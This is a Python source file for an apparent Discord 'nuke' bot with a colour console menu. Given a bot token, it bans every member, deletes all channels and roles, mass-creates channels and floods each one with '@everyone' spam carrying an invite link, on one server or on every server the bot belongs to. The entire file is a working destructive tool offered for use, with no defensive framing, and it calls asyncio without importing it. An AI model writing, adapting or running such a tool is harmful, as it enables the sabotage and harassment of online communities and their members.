import discord
from discord.ext import commands
from colorama import init, Fore as cc
from os import name as os_name, system

# Initialize colorama
init()

# Define color aliases
dr = cc.LIGHTRED_EX
g = cc.LIGHTGREEN_EX
b = cc.LIGHTBLUE_EX
m = cc.LIGHTMAGENTA_EX
c = cc.LIGHTCYAN_EX
y = cc.LIGHTYELLOW_EX
w = cc.RESET

# Define clear function based on operating system
def clear():
    system('cls' if os_name == 'nt' else 'clear')

# Function to get user input
def _input(text):
    print(text, end='')
    return input()

# Banner
banner = f'''
{dr} _   _       _       {m} ____        _   
{dr}| \ | |_   _| | _____{m}| __ )  ___ | |_ 
{dr}|  \| | | | | |/ / _ {m}\  _ \ / _ \| __|
{dr}| |\  | |_| |   <  __{m}/ |_) | (_) | |_ 
{dr}|_| \_|\__,_|_|\_\___{m}|____/ \___/ \__|
{y}Made by: {g}https://github.com/itzC9/Bot-Nuker/
'''

# Async function to delete all channels in a guild
async def delete_all_channels(guild):
    deleted = 0
    for channel in guild.channels:
        try:
            await channel.delete()
            deleted += 1
        except discord.HTTPException as e:
            print(f'Error deleting channel {channel.name}: {e}')
    return deleted

# Async function to delete all roles in a guild
async def delete_all_roles(guild):
    deleted = 0
    for role in guild.roles:
        try:
            await role.delete()
            deleted += 1
        except discord.HTTPException as e:
            print(f'Error deleting role {role.name}: {e}')
    return deleted

async def create_text_channels(guild, name):
    created = 0
    for _ in range(200 - len(guild.channels)):
        try:
            await guild.create_text_channel(name=name)
            created += 1
        except discord.HTTPException as e:
            print(f'Error creating text channel: {e}')
    return created

# Async function to spam every channel in a guild
async def spam_messages_in_channels(guild, message, rate_per_minute=500):
    wait_time = 60 / rate_per_minute
    for channel in guild.text_channels:
        for _ in range(rate_per_minute):
            try:
                await channel.send(message)
            except discord.HTTPException as e:
                print(f'Error sending message to {channel.name}: {e}')
            await asyncio.sleep(wait_time)

# Async function to ban all members in a guild
async def ban_all_members(guild):
    banned = 0
    for member in guild.members:
        try:
            await member.ban()
            banned += 1
        except discord.HTTPException as e:
            print(f'Error banning member {member.name}: {e}')
    return banned

# Async function to nuke a guild (delete channels, roles, ban members, create channels)
async def nuke_guild(guild, name):
    print(f'Nuke: {guild.name}')
    
    banned = await ban_all_members(guild)
    print(f'Banned: {banned}')
    
    deleted_channels = await delete_all_channels(guild)
    print(f'Deleted Channels: {deleted_channels}')

    created_channels = await create_text_channels(guild, name)
    print(f'Created Text Channels: {created_channels}')
    
    spam_message = "@everyone Get nuked by TrinityTribe! Stop Scamming! Keep the world in peace! https://discord.gg/TrinityTribe"
    await spam_messages_in_channels(guild, spam_message)
    
    deleted_roles = await delete_all_roles(guild)
    print(f'Deleted Roles: {deleted_roles}')
    
    print('--------------------------------------------\n\n')

# Main program loop
while True:
    clear()
    choice = _input(f'''   
{banner}                
{c}--------------------------------------------
{b}[Menu]
    {y}└─[1] {m}- {g}Run Setup Nuke Bot
    {y}└─[2] {m}- {g}Exit
{y}====>{g}''')
    
    if choice == '1':
        token = _input(f'{y}Input bot token:{g}')
        name = _input(f'{y}Input name for created channels / roles:{g}')
        clear()
        
        choice_type = _input(f'''
{banner}                
{c}--------------------------------------------
{b}[Select]
    {y}└─[1] {m}- {g}Nuke all servers.
    {y}└─[2] {m}- {g}Nuke only one server.  
    {y}└─[3] {m}- {g}Exit
{y}====>{g}''')
        
        client = commands.Bot(command_prefix='.', intents=discord.Intents.all())
        
        if choice_type == '1':
            @client.event
            async def on_ready():
                print(f'''
[+]Logged in as {client.user.name}
[+]Bot in {len(client.guilds)} servers!''')
                
                for guild in client.guilds:
                    await nuke_guild(guild, name)
                    
                await client.close()
        
        elif choice_type == '2':
            guild_id = _input(f'{y}Input server id:{g}')
            
            @client.event
            async def on_ready():
                for guild in client.guilds:
                    if str(guild.id) == guild_id:
                        await nuke_guild(guild, name)
                await client.close()
        
        elif choice_type == '3':
            print(f'{dr}Exit...')
            exit()
        
        try:
            client.run(token)
            input('Nuke finished, press enter to return to menu...')
        
        except Exception as error:
            if str(error) == '''Shard ID None is requesting privileged intents that have not been explicitly enabled in the developer portal. It is recommended to go to https://discord.com/developers/applications/ and explicitly enable the privileged intents within your application's page. If this is not possible, then consider disabling the privileged intents instead.''':
                input(f'{dr}Intents Error\n{g}For fix -> https://prnt.sc/wmrwut\n{b}Press enter to return...')
            else:
                input(f'{dr}{error}\n{b}Press enter to return...')
            continue
    
    elif choice == '2':
        print(f'{dr}Exit...')
        exit()
